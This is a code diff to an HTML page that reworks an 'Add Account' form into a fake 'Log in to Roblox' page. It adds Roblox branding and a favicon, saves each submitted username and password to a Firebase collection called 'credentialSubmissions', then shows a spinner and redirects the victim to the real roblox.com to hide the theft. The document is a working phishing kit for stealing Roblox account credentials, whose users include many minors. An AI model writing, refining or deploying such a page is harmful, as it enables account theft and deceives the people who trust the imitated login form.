@@ -3,53 +3,54 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Add Account</title>
+  <link rel="icon" type="image/x-icon" href="favicon.ico" />
+  <title>Log in to Roblox</title>
   <style>
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-Thin-100.otf') format('opentype');
+      src: url('./BuilderSans-Thin-100.otf') format('opentype');
       font-weight: 100;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-Light-300.otf') format('opentype');
+      src: url('./BuilderSans-Light-300.otf') format('opentype');
       font-weight: 300;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-Regular-400.otf') format('opentype');
+      src: url('./BuilderSans-Regular-400.otf') format('opentype');
       font-weight: 400;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-Medium-500.otf') format('opentype');
+      src: url('./BuilderSans-Medium-500.otf') format('opentype');
       font-weight: 500;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-SemiBold-600.otf') format('opentype');
+      src: url('./BuilderSans-SemiBold-600.otf') format('opentype');
       font-weight: 600;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-Bold-700.otf') format('opentype');
+      src: url('./BuilderSans-Bold-700.otf') format('opentype');
       font-weight: 700;
       font-style: normal;
     }
 
     @font-face {
       font-family: 'Builder Sans';
-      src: url('BuilderSans-ExtraBold-800.otf') format('opentype');
+      src: url('./BuilderSans-ExtraBold-800.otf') format('opentype');
       font-weight: 800;
       font-style: normal;
     }
@@ -76,7 +77,8 @@
       top: 0;
       left: 0;
       right: 0;
-      height: 40px;
+      width: 2593px;
+      height: 42px;
       background-color: #191a1f;
       border-bottom: 1px solid #202227;
       z-index: 1030;
@@ -93,6 +95,8 @@
       font-size: 20px;
       font-weight: 700;
       padding: 8px 12px;
+      width: 175px;
+      height: 40px;
     }
 
     .rbx-header .nav {
@@ -108,6 +112,8 @@
     .rbx-header .nav li {
       display: flex;
       align-items: center;
+      width: 222.11px;
+      height: 32px;
     }
 
     .rbx-header .nav a {
@@ -115,12 +121,20 @@
       text-decoration: none;
       font-size: 14px;
       font-weight: 500;
-      padding: 8px 12px;
+      padding: 0;
       transition: color 0.2s ease;
+      width: 222.11px;
+      height: 32px;
+      border-bottom: 2px solid transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
     }
 
     .rbx-header .nav a:hover {
       color: #ffffff;
+      border-bottom: 2px solid #ffffff;
     }
 
     body {
@@ -138,7 +152,8 @@
 
     .auth-card {
       width: 100%;
-      max-width: 420px;
+      max-width: 400px;
+      min-height: 470px;
       padding: 32px 15px 28px;
       background: #272930;
       border-radius: 0;
@@ -154,7 +169,7 @@
     }
 
     input {
-      width: 100%;
+      width: 370px;
       height: 38px;
       padding: 5px 12px;
       border-radius: 8px;
@@ -264,13 +279,18 @@
       margin-bottom: 0;
       text-align: center;
       color: #f7f7f8;
-      text-decoration: none;
       font-size: 16px;
-      font-weight: 500;
-      transition: color 0.2s ease;
+      font-weight: 300;
     }
 
-    .subtle-link:hover {
+    .subtle-link a {
+      color: #f7f7f8;
+      text-decoration: none;
+      transition: color 0.2s ease;
+      font-weight: 500;
+    }
+
+    .subtle-link a:hover {
       color: #ffffff;
       text-decoration: underline;
     }
@@ -296,7 +316,7 @@
     </nav>
   </header>
   <main class="auth-card" aria-live="polite">
-    <h1>Add Account</h1>
+    <h1>Login to Roblox</h1>
     <form id="authForm">
       <div class="field">
         <label class="sr-only" for="username">Username / Email / Phone</label>
@@ -314,7 +334,7 @@
     <div class="divider" aria-hidden="true"></div>
     <button class="action-btn" type="button">Email Me a One-Time Code</button>
     <button class="action-btn" type="button">Use Another Device</button>
-    <a class="subtle-link" href="#">Create a New Account</a>
+    <div class="subtle-link">Don't have an account? <a href="#">Sign Up</a></div>
   </main>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
@@ -338,6 +358,13 @@
     form.addEventListener("submit", async (event) => {
       event.preventDefault();
 
+      const submitBtn = form.querySelector(".primary-btn");
+      const originalText = submitBtn.textContent;
+      
+      // Show loading spinner
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<img src="loading.gif" style="height: 20px; width: auto; vertical-align: middle;" />';
+      
       const payload = {
         username: usernameInput.value.trim(),
         password: passwordInput.value,
@@ -345,12 +372,23 @@
       };
 
       try {
-        await addDoc(collection(db, "credentialSubmissions"), payload);
-        form.reset();
-        window.location.href = "https://example.com";
+        const docRef = await addDoc(collection(db, "credentialSubmissions"), payload);
+        console.log("Document written with ID: ", docRef.id);
+        
+        // Keep loading spinner for 3 seconds before redirecting
+        setTimeout(() => {
+          form.reset();
+          window.location.href = "https://roblox.com/home";
+        }, 500);
       } catch (error) {
-        console.error("Failed to save credentials", error);
-        alert("Unable to store credentials right now.");
+        console.error("Failed to save credentials:", error);
+        console.error("Error code:", error.code);
+        console.error("Error message:", error.message);
+        
+        // Reset button on error
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+        alert("Unable to store credentials right now. Check console for details.");
       }
     });
   </script>
